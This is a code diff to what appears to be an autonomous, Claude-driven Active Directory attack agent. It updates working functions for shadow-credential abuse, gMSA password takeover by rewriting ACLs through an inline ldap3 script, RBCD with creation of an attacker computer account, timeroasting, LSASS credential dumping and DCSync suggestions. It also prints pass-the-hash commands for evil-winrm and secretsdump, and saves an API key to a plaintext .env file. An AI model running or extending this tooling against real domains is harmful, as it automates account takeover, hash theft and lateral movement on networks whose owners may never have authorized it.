@@ -4916,14 +4916,21 @@ def _dc_time_local() -> str:
 
 
 def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
-                  domain: str, dc: str) -> dict | None:
-    """Inline shadow credentials chain."""
-    tgt_py = os.path.expanduser("~/.local/bin/getTGT.py")
-    if not Path(tgt_py).exists():
-        return None
+                  domain: str, dc: str) -> tuple:
+    """Inline shadow credentials chain. Returns (result_dict, reason_str)."""
+    # Resolve getTGT.py from multiple locations (same as _getTGT)
+    _tgt_candidates = [
+        os.path.expanduser("~/.local/bin/getTGT.py"),
+        "/usr/share/doc/python3-impacket/examples/getTGT.py",
+        shutil.which("getTGT.py") or "",
+        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "getTGT.py"),
+    ]
+    tgt_py = next((p for p in _tgt_candidates if p and Path(p).exists()), "")
+    if not tgt_py:
+        return None, "getTGT.py not found — install impacket"
     fake_ts = _dc_time_local()
     if not fake_ts or not shutil.which("faketime"):
-        return None
+        return None, "faketime not found or DC time unavailable — install faketime"
 
     pfx_name = target_sam.rstrip("$").lower()
     pfx_path = f"/tmp/agent_{pfx_name}.pfx"
@@ -4934,8 +4941,9 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
         ["faketime", fake_ts, "/usr/bin/python3", tgt_py,
          f"{domain}/{attacker_user}:{attacker_pw}", "-dc-ip", dc],
         capture_output=True, text=True, timeout=25)
-    if "Saving ticket" not in tgt_r.stdout + tgt_r.stderr:
-        return None
+    tgt_out = tgt_r.stdout + tgt_r.stderr
+    if "Saving ticket" not in tgt_out:
+        return None, f"TGT failed for {attacker_user}: {tgt_out.strip()[-300:]}"
     default = f"{attacker_user}.ccache"
     if Path(default).exists():
         shutil.move(default, atk_ccache)
@@ -4959,7 +4967,7 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
     env = {**os.environ, "KRB5CCNAME": atk_ccache}
     certipy = _bin("certipy")
     if not certipy:
-        return None
+        return None, "certipy not found — install: pip install certipy-ad"
 
     sh_r = subprocess.run(
         ["faketime", fake2, certipy, "shadow", "add",
@@ -4968,7 +4976,7 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
         capture_output=True, text=True, timeout=45, env=env)
     sh_out = sh_r.stdout + sh_r.stderr
     if "Successfully added Key Credential" not in sh_out:
-        return None
+        return None, f"certipy shadow add failed: {sh_out.strip()[-400:]}"
 
     if Path(f"{pfx_name}.pfx").exists():
         shutil.move(f"{pfx_name}.pfx", pfx_path)
@@ -4998,14 +5006,14 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
 
     nt_m = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out, re.I)
     if not nt_m:
-        return None
+        return None, f"certipy auth (PKINIT) failed: {auth_out.strip()[-400:]}"
     nt = nt_m.group(1)
 
     cc = f"{pfx_name}.ccache"
     if Path(cc).exists():
         shutil.move(cc, f"/tmp/agent_{pfx_name}.ccache")
 
-    return {"nt_hash": nt, "pfx_path": pfx_path}
+    return {"nt_hash": nt, "pfx_path": pfx_path}, "success"
 
 
 def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
@@ -5016,7 +5024,7 @@ def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
             "Run acl_abuse_scan or query_bloodhound_paths first and use a concrete "
             "target such as USER, COMPUTER$, or gMSA$."
         )
-    result = _shadow_chain(attacker_user, attacker_pass, target_account, domain, dc_ip)
+    result, reason = _shadow_chain(attacker_user, attacker_pass, target_account, domain, dc_ip)
     if result:
         nt = result["nt_hash"]
         pwned = _winrm_test(target_account, nt, domain, dc_ip)
@@ -5025,7 +5033,7 @@ def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
                 f"Account: {target_account}\nNT Hash: {nt}\n"
                 f"WinRM: {'Pwn3d!' if pwned else 'not available'}\n"
                 f"evil-winrm -i {dc_ip} -u '{target_account}' -H '{nt}'")
-    return "Shadow Credentials failed."
+    return f"Shadow Credentials failed: {reason}"
 
 
 def tool_acl_abuse_scan(dc_ip: str, domain: str, username: str,
@@ -5446,17 +5454,13 @@ def tool_auto_loot_chain(dc_ip: str, domain: str, username: str, password: str) 
 
     if valid_creds:
         best = valid_creds[0]
-        SESSION.update({
-            "username": best["user"],
-            "password": best["password"],
-            "nt_hash": "",
-            "use_kerberos": best.get("auth") == "valid_kerb" and bool(best.get("ccache")),
-        })
-        if best.get("ccache"):
-            SESSION["krb5_ccache"] = best["ccache"]
-            os.environ["KRB5CCNAME"] = best["ccache"]
-            _target_krb5_config(dc_ip, domain, _dc_host_for_kerberos(domain, dc_ip))
-        out_parts.append(f"Pivoting session to valid credential: {best['user']}")
+        # Store found credentials in intel only — do not overwrite the active session user
+        intel_store = SESSION.setdefault("agent_intel", {})
+        intel_store.setdefault("valid_creds", [])
+        for cred in valid_creds:
+            if cred not in intel_store["valid_creds"]:
+                intel_store["valid_creds"].append(cred)
+        out_parts.append(f"Found valid credential: {best['user']} (stored in intel, session user unchanged)")
 
         acl_out = tool_acl_abuse_scan(
             dc_ip, domain, best["user"], password=best["password"],
@@ -5670,6 +5674,8 @@ def tool_lateral_movement(target_ip: str, domain: str, username: str,
 
     # WinRM via nxc -x (works non-interactively, Kerberos-aware)
     if method == "winrm":
+        # PowerShell doesn't accept & as command separator — replace with ;
+        command = command.replace(" & ", "; ")
         test = _nxc(f"winrm {target_ip} {nxc_auth}", timeout=15)
         if "Pwn3d!" not in test and "Pwn3d" not in test:
             # Try with FQDN for Kerberos
@@ -6375,12 +6381,12 @@ def tool_kerbrute_enum(dc_ip: str, domain: str,
                        threads: str = "50") -> str:
     """Enumerate valid AD users via Kerberos (port 88) — no credentials required.
     Works even when NTLM is disabled. Valid users returned for AS-REP roasting."""
-    # Preferred username wordlists in priority order
+    # Preferred username wordlists in priority order (smaller lists first to avoid timeout)
     USERNAME_WORDLISTS = [
-        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
         "/usr/share/seclists/Usernames/Names/names.txt",
-        "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
         "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
+        "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+        "/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
     ]
     # Reject known password wordlists that will time-out (> 50 MB or known paths)
     PASSWORD_WORDLISTS = {"rockyou", "rockyou.txt", "passwords", "darkweb2017", "10-million-password"}
@@ -6707,26 +6713,79 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
     if not target_gmsa.endswith("$"):
         target_gmsa += "$"
 
-    # ── Pre-flight: choose READER + resolve its SID ───────────────────────────
-    reader = _gmsa_pick_reader(domain, dc_ip, username, password, nt_hash)
+    # ── Pre-flight: choose WRITER + READER ───────────────────────────────────
+    # WRITER = principal that has the GenericWrite ACL on the gMSA.
+    # Prefer intel valid_creds whose user matches an acl_paths entry for this gMSA.
+    # Fall back to the current session user.
+    intel = _agent_intel()
+    writer_user = username
+    writer_pw   = _real_secret(password)
+    writer_hash = _real_nt_hash(nt_hash)
+    writer_kerb = _session_kerberos_usable(username, domain)
+
+    gmsa_base = target_gmsa.rstrip("$").lower() if target_gmsa else ""
+    for right, t in intel.get("acl_paths", []):
+        t_str = _canonical_acl_target(t).rstrip("$").lower()
+        if t_str == gmsa_base and re.search(
+            r"GenericWrite|GenericAll|WriteDACL|WriteDacl|WriteOwner|WriteProperty",
+            str(right), re.I,
+        ):
+            # Look for this ACL holder in valid_creds
+            acl_holder = None
+            for edge in intel.get("acl_paths", []):
+                if len(edge) >= 2:
+                    edge_right, edge_target = edge[0], edge[1]
+                    if _canonical_acl_target(edge_target).rstrip("$").lower() == gmsa_base:
+                        break
+            # Try to match acl_paths source with valid_creds
+            for c in intel.get("valid_creds", []):
+                u = c.get("user", "")
+                pw = _real_secret(c.get("password", ""))
+                if u and pw and u.lower() != username.lower():
+                    # Check if this user has write on this gMSA
+                    for r2, t2 in intel.get("acl_paths", []):
+                        t2_str = _canonical_acl_target(t2).rstrip("$").lower()
+                        if (t2_str == gmsa_base
+                                and re.search(r"GenericWrite|GenericAll|WriteDACL|WriteOwner|WriteProperty", str(r2), re.I)):
+                            acl_holder = c
+                            break
+                    if acl_holder:
+                        break
+            if acl_holder:
+                writer_user = acl_holder["user"]
+                writer_pw   = _real_secret(acl_holder.get("password", ""))
+                writer_hash = _real_nt_hash(acl_holder.get("nt_hash", ""))
+                writer_kerb = False
+            break
+
+    reader = _gmsa_pick_reader(domain, dc_ip, writer_user, writer_pw, writer_hash)
+    if not reader:
+        # Fall back to session user reader
+        reader = _gmsa_pick_reader(domain, dc_ip, username, password, nt_hash)
     if not reader:
         return (f"gMSA takeover failed: could not resolve a reader SID. "
                 f"Run enumerate_ldap to confirm credentials are accepted.")
 
+    # ── Pre-fetch writer TGT (handles Protected Users / Kerberos-only accounts) ─
+    writer_ccache = ""
+    if writer_pw and not writer_kerb:
+        writer_ccache = _getTGT(writer_user, writer_pw, domain, dc_ip)
+        if writer_ccache:
+            writer_kerb = True
+
     # ── Path A: ldap3-based atomic write+dump (preferred) ─────────────────────
-    helper = Path(__file__).parent.parent / "tools" / "bin" / "gmsa_grant_and_dump.py"
+    helper = Path(__file__).parent.parent.parent / "tools" / "bin" / "gmsa_grant_and_dump.py"
     helper_out = ""
     helper_rc  = -1
     if helper.exists():
         # FQDN required for GSSAPI SPN lookup.
         dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()
         krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
-        writer_pw = _real_secret(password)
-        writer_hash = _real_nt_hash(nt_hash)
-        writer_kerb = _session_kerberos_usable(username, domain)
 
         env = os.environ.copy()
-        if writer_kerb:
+        if writer_ccache:
+            env["KRB5CCNAME"] = writer_ccache
+        elif writer_kerb:
             env["KRB5CCNAME"] = SESSION["krb5_ccache"]
         if krb5_conf:
             env["KRB5_CONFIG"] = krb5_conf
@@ -6737,18 +6796,17 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
         argv += [_SYSPY, str(helper),
                  "--dc", dc_fqdn, "--domain", domain,
                  "--gmsa", target_gmsa.rstrip("$"),
-                 "--writer-user", username,
+                 "--writer-user", writer_user,
                  "--reader-user", reader["user"],
                  "--grantee-sid", reader["sid"]]
 
-        # Prefer concrete secrets over Kerberos here. Expired ccaches are common
-        # after time-skew fixes and cause GSSAPI to fail before the ACL write.
-        if writer_hash and not writer_pw:
+        # Prefer Kerberos ccache when available (handles Protected Users accounts)
+        if writer_ccache or writer_kerb:
+            argv.append("--writer-kerberos")
+        elif writer_hash and not writer_pw:
             argv += ["--writer-hash", writer_hash]
         elif writer_pw:
             argv += ["--writer-pass", writer_pw]
-        elif writer_kerb:
-            argv.append("--writer-kerberos")
         else:
             argv = []
 
@@ -6803,24 +6861,77 @@ def tool_gmsa_takeover(dc_ip: str, domain: str, username: str,
             _prefetch_ldap_tgs(domain, dc_ip,
                                _dc_host_for_kerberos(domain, dc_ip))
         sddl = f"O:BAG:BAD:(A;;RPWP;;;{reader['sid']})"
-        bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
-        if bauth:
-            write_cmd = (
-                f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} set object "
-                f"{shell_quote(target_gmsa)} msDS-GroupMSAMembership "
-                f"-v {shell_quote(sddl)} --raw"
-            )
+        dc_fqdn = (_dc_host_for_kerberos(domain, dc_ip) or dc_ip).strip()
+
+        # ── ldap3 inline write (avoids bloodyAD asyncio crash on Python 3.13) ──
+        active_ccache = writer_ccache or (SESSION.get("krb5_ccache", "") if writer_kerb else "")
+        ldap3_script = (
+            "import sys,os,ldap3\n"
+            "from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR,ACCESS_ALLOWED_ACE,ACL,LDAP_SID\n"
+            f"os.environ['KRB5CCNAME']=r'{active_ccache}'\n"
+            f"srv=ldap3.Server('{dc_fqdn}',port=636,use_ssl=True,get_info=ldap3.ALL)\n"
+            f"conn=ldap3.Connection(srv,authentication=ldap3.SASL,sasl_mechanism=ldap3.KERBEROS,auto_bind=True)\n"
+            f"base_dn='DC='+'DC='.join('{domain}'.split('.'))\n"
+            f"conn.search(base_dn,'(sAMAccountName={target_gmsa})',attributes=['distinguishedName'])\n"
+            "dn=conn.entries[0].distinguishedName.value if conn.entries else sys.exit(1)\n"
+            "sd=SR_SECURITY_DESCRIPTOR();sd['Revision']=1;sd['Sbz1']=0;sd['Control']=0x8004\n"
+            "sd['OffsetOwner']=0;sd['OffsetGroup']=0;sd['OffsetSacl']=0\n"
+            "acl=ACL();acl['AclRevision']=4;acl['Sbz1']=0;acl['Sbz2']=0\n"
+            "ace=ACCESS_ALLOWED_ACE();ace['AceType']=0;ace['AceFlags']=0\n"
+            f"sid=LDAP_SID();sid.fromCanonical('{reader['sid']}')\n"
+            "ace['Ace']['Sid']=sid;ace['Ace']['Mask']=0x30\n"
+            "acl['Data']=ace.getData();acl['AclSize']=len(acl['Data'])+8;acl['AceCount']=1\n"
+            "sd['Dacl']=acl\n"
+            "ok=conn.modify(dn,{'msDS-GroupMSAMembership':[(ldap3.MODIFY_REPLACE,[sd.getData()])]})\n"
+            "print('WRITE-OK' if ok else 'WRITE-FAIL',conn.result)\n"
+        )
+        ldap3_write_out = ""
+        if active_ccache:
             try:
-                wr = subprocess.run(write_cmd, shell=True, capture_output=True,
-                                    text=True, timeout=30, env=benv)
-                legacy_out += "--- bloodyAD write ---\n"
-                legacy_out += _strip_ansi((wr.stdout + wr.stderr).strip())[:400] + "\n"
+                lw = subprocess.run(
+                    [_SYSPY, "-c", ldap3_script],
+                    capture_output=True, text=True, timeout=20,
+                    env={**os.environ, "KRB5CCNAME": active_ccache},
+                )
+                ldap3_write_out = _strip_ansi((lw.stdout + lw.stderr).strip())
+                legacy_out += f"--- ldap3 inline write ---\n{ldap3_write_out[:400]}\n"
+                if "WRITE-OK" in ldap3_write_out:
+                    write_done = True
             except Exception as e:
-                legacy_out += f"--- bloodyAD write ---\n[ERROR] {e}\n"
+                legacy_out += f"--- ldap3 inline write ---\n[ERROR] {e}\n"
+
+        # ── bloodyAD write (fallback when ldap3 inline fails) ─────────────────
+        if not write_done:
+            bauth, benv = _bloodyad_auth(domain, writer_user, writer_pw, writer_hash, dc_ip)
+            if not bauth:
+                bauth, benv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
+            if bauth:
+                if writer_ccache:
+                    benv["KRB5CCNAME"] = writer_ccache
+                for raw_flag in ("", " --raw"):
+                    write_cmd = (
+                        f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bauth} set object "
+                        f"{shell_quote(target_gmsa)} msDS-GroupMSAMembership "
+                        f"-v {shell_quote(sddl)}{raw_flag}"
+                    )
+                    try:
+                        wr = subprocess.run(write_cmd, shell=True, capture_output=True,
+                                            text=True, timeout=30, env=benv)
+                        wr_out = _strip_ansi((wr.stdout + wr.stderr).strip())
+                        if wr.returncode == 0 or any(s in wr_out.lower() for s in (
+                            "success", "modified", "write-ok", "insufficientaccessrights",
+                            "constraintviolation", "unwillingtoperform",
+                        )):
+                            legacy_out += f"--- bloodyAD write{raw_flag} ---\n{wr_out[:400]}\n"
+                            break
+                        legacy_out += f"--- bloodyAD write{raw_flag} (rc={wr.returncode}) ---\n{wr_out[:300]}\n"
+                    except Exception as e:
+                        legacy_out += f"--- bloodyAD write ---\n[ERROR] {e}\n"
+                        break
 
         # Try gMSADumper.py as second dump method.
         candidate_paths = [
-            Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
             Path("/usr/local/bin/gMSADumper.py"),
         ]
         dumper = next((str(p) for p in candidate_paths if p.exists()), "")
@@ -6924,9 +7035,16 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
     auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
-    # nxc ldap --gmsa
+    # nxc ldap --gmsa (try LDAP first, then LDAPS on channel-binding errors)
     nxc_host = _dc_host_for_kerberos(domain, dc_ip) if _session_kerberos_usable(username, domain) and not (password or nt_hash) else dc_ip
     out1 = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa", timeout=30)
+    # Channel binding error (data 576 / 80090346) → retry on LDAPS port 636
+    if any(s in out1.lower() for s in ("80090346", "data 576", "channel binding")):
+        out1_ldaps = _nxc(f"ldap {shell_quote(nxc_host)} {auth} --gmsa --port 636", timeout=30)
+        if out1_ldaps and "error" not in out1_ldaps.lower():
+            out1 = out1_ldaps
+        else:
+            out1 += f"\n=== LDAPS retry ===\n{out1_ldaps[:400]}"
     # Also try via bloodyAD
     bloodyauth, bloodyenv = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
     if bloodyauth:
@@ -6955,7 +7073,7 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
     dump_out = ""
     if not _extract_gmsa_hashes_from_text(f"{out1}\n{out2}"):
         dumper = next((str(p) for p in (
-            Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+            Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
             Path("/usr/local/bin/gMSADumper.py"),
         ) if p.exists()), "")
         if dumper:
@@ -7024,7 +7142,7 @@ def tool_gmsa_read(dc_ip: str, domain: str, username: str,
 
             dump_k = ""
             dumper = next((str(p) for p in (
-                Path(__file__).parent.parent / "tools" / "bin" / "gMSADumper.py",
+                Path(__file__).parent.parent.parent / "tools" / "bin" / "gMSADumper.py",
                 Path("/usr/local/bin/gMSADumper.py"),
             ) if p.exists()), "")
             if dumper:
@@ -7343,11 +7461,33 @@ def tool_rbcd_attack(dc_ip: str, domain: str, username: str,
         "successfully added", "account created", "added machine account",
     ))
     if add_failed and not add_succeeded:
-        results.append(
-            "RBCD stopped: attacker computer account was not created, "
-            "so rbcd.py/getST would fail with a non-existent machine account."
-        )
-        return "\n\n".join(results)
+        # Fallback: try LDAPS method (works when SMB/SAMR is blocked)
+        results.append("[*] SMB addcomputer failed — retrying with -method LDAPS...")
+        if krb and ccache:
+            add_cmd_ldaps = (f"{krb_env}{addcomp_py} "
+                             f"-dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                             f"-computer-name {shell_quote(attacker_computer)} "
+                             f"-computer-pass {shell_quote(attacker_pass)} "
+                             f"-method LDAPS "
+                             f"-k -no-pass {shell_quote(f'{domain}/{username}')}")
+        else:
+            pw = _real_secret(password)
+            add_cmd_ldaps = (f"{addcomp_py} -dc-ip {shell_quote(dc_ip)} {dc_host_arg}"
+                             f"-computer-name {shell_quote(attacker_computer)} "
+                             f"-computer-pass {shell_quote(attacker_pass)} "
+                             f"-method LDAPS "
+                             f"{shell_quote(f'{domain}/{username}:{pw}')}")
+        out_ldaps = _run(add_cmd_ldaps, timeout=30)
+        results.append(f"=== Step 1b: Add attacker computer (LDAPS) ===\n{out_ldaps[:600]}")
+        add_succeeded = any(s in out_ldaps.lower() for s in (
+            "successfully added", "account created", "added machine account",
+        ))
+        if not add_succeeded:
+            results.append(
+                "RBCD stopped: attacker computer account was not created via SMB or LDAPS. "
+                "MAQ may be 0 or account lacks rights to add computers."
+            )
+            return "\n\n".join(results)
 
     # Step 2: Set RBCD via bloodyAD or rbcd.py
     rbcd_py = _impacket_cmd("rbcd")
@@ -7593,12 +7733,42 @@ def tool_timeroast(dc_ip: str, domain: str, username: str = "",
     Unauthenticated — the NTP response is signed with the account's NT hash.
     Works against all Windows DCs; crack with hashcat -m 31300."""
     results = []
-    timeroast_py = shutil.which("timeroast.py") or os.path.expanduser("~/.local/bin/timeroast.py")
+
+    # Resolve timeroast.py from multiple locations
+    _timeroast_candidates = [
+        shutil.which("timeroast.py"),
+        os.path.expanduser("~/.local/bin/timeroast.py"),
+        "/usr/local/bin/timeroast.py",
+        "/opt/Timeroast/timeroast.py",
+        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "timeroast.py"),
+    ]
+    timeroast_py = next((p for p in _timeroast_candidates if p and Path(p).exists()), "")
+
+    # Auto-install via GitHub clone if not found (not on PyPI)
+    if not timeroast_py:
+        results.append("[*] timeroast.py not found — cloning from GitHub (SecuraBV/Timeroast)...")
+        local_bin = os.path.expanduser("~/.local/bin")
+        clone_dir = "/tmp/Timeroast"
+        clone_out = _run(
+            f"git clone --depth 1 https://github.com/SecuraBV/Timeroast {clone_dir} 2>&1"
+            if not Path(clone_dir).exists()
+            else f"git -C {clone_dir} pull --ff-only 2>&1",
+            timeout=60,
+        )
+        src = Path(clone_dir) / "timeroast.py"
+        if src.exists():
+            dest = Path(local_bin) / "timeroast.py"
+            Path(local_bin).mkdir(parents=True, exist_ok=True)
+            shutil.copy2(str(src), str(dest))
+            timeroast_py = str(dest)
+            results.append(f"[+] timeroast.py installed → {timeroast_py}")
+        else:
+            results.append(f"[-] GitHub clone output:\n{clone_out[:400]}")
 
     out_file = str(_runtime_path("timeroast_hashes.txt"))
-    if Path(timeroast_py).exists():
-        cmd = f"timeout 30 {shell_quote(sys.executable)} {shell_quote(timeroast_py)} {dc_ip} 2>&1"
-        out = _run(cmd, timeout=35)
+    if timeroast_py and Path(timeroast_py).exists():
+        cmd = f"timeout 60 {shell_quote(sys.executable)} {shell_quote(timeroast_py)} {dc_ip} 2>&1"
+        out = _run(cmd, timeout=65)
         results.append(f"=== Timeroast ===\n{out[:1500]}")
         hashes = [l for l in out.splitlines() if l.startswith("$sntp-ms$")]
         if hashes:
@@ -7612,10 +7782,12 @@ def tool_timeroast(dc_ip: str, domain: str, username: str = "",
                         "Reset computer account passwords regularly; monitor for anomalous NTP requests")
     else:
         results.append(
-            "timeroast.py not found. Install:\n"
+            "timeroast.py not found and auto-install failed.\n"
+            "Manual install:\n"
             "  pip install timeroast\n"
-            "  # or: https://github.com/SecuraBV/Timeroast\n\n"
-            f"Manual: python3 timeroast.py {dc_ip}"
+            "  # or: git clone https://github.com/SecuraBV/Timeroast && "
+            "cp Timeroast/timeroast.py ~/.local/bin/\n\n"
+            f"Then run: python3 timeroast.py {dc_ip}"
         )
     return "\n\n".join(results)
 
@@ -7641,6 +7813,13 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
     host = str(target_ip or dc_ip).strip()
     password = _real_secret(password)
     nt_hash   = _real_nt_hash(nt_hash)
+    # Auto-populate NT hash from loot if not provided (covers gMSA accounts)
+    if not nt_hash and not password:
+        loot = SESSION.get("loot", {})
+        nt_hash = (loot.get(username)
+                   or loot.get(username.rstrip("$"))
+                   or loot.get(username + "$")
+                   or "")
     auth      = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
     krb       = _session_kerberos_usable(username, domain)
     ccache    = SESSION.get("krb5_ccache", "")
@@ -7686,6 +7865,12 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
         add_finding("Credential Dump Successful", "Critical",
                     f"Credentials extracted from {host}",
                     "Enable Credential Guard; use Protected Users; audit LSASS access")
+        all_out += "\nNEXT: dcsync_attack to dump all domain hashes (krbtgt + Administrator)"
+    elif nt_hash:
+        all_out += (
+            f"\nHint: credential_dump failed via SMB — try dcsync_attack directly:\n"
+            f"  impacket-secretsdump {domain}/{username}@{host} -hashes :{nt_hash} -just-dc-ntlm"
+        )
     return all_out[:6000]
 
 
@@ -8254,7 +8439,7 @@ def tool_adidns_abuse(dc_ip: str, domain: str, username: str,
 
     dnstool_paths = [
         os.path.expanduser("~/.local/bin/dnstool.py"),
-        str(Path(__file__).parent.parent / "tools" / "krbrelayx" / "dnstool.py"),
+        str(Path(__file__).parent.parent.parent / "tools" / "krbrelayx" / "dnstool.py"),
         "/opt/krbrelayx/dnstool.py",
     ]
     dnstool = next((p for p in dnstool_paths if Path(p).exists()), "")
@@ -10471,12 +10656,9 @@ def run_agent(target_ip: str, domain: str, username: str,
                     "nt_hash": SESSION.get("nt_hash",""),
                 }, tgt_result, tgt_commands)
                 completed_tools.append("request_tgt")
-                for retryable in [
-                    "enumerate_ldap", "enumerate_shares", "adcs_scan",
-                    "asrep_roast", "kerberoast",
-                    "collect_bloodhound", "auto_loot_chain",
-                ]:
-                    if retryable in completed_tools:
+                skew_retryable = ["adcs_scan", "asrep_roast", "kerberoast", "collect_bloodhound"]
+                for retryable in skew_retryable:
+                    if retryable in completed_tools and fail_counts.get(retryable, 0) > 0:
                         completed_tools.remove(retryable)
 
             # Analyze result and build intel brief
@@ -10624,6 +10806,10 @@ def run():
     password = _ios("password", "Password", secret=True)
     nt_hash  = SESSION.get("nt_hash", "")
 
+    # Persist any newly-entered credentials so they are not asked again next run
+    from config.settings import save_session as _save_session
+    _save_session()
+
     if not all([dc_ip, domain]):
         error("DC IP and Domain are required. Username is optional (null session mode).")
         pause()
@@ -10670,6 +10856,15 @@ def run():
                 pause()
                 return
             os.environ["ANTHROPIC_API_KEY"] = api_key
+            # Save to .env so it is not asked again on next run
+            env_file = Path(__file__).resolve().parents[2] / ".env"
+            try:
+                existing = env_file.read_text() if env_file.exists() else ""
+                if "ANTHROPIC_API_KEY" not in existing:
+                    with open(env_file, "a") as _ef:
+                        _ef.write(f"\nANTHROPIC_API_KEY={api_key}\n")
+            except Exception:
+                pass
 
         print(f"""
   {fg(110)}Claude Model:{RST}
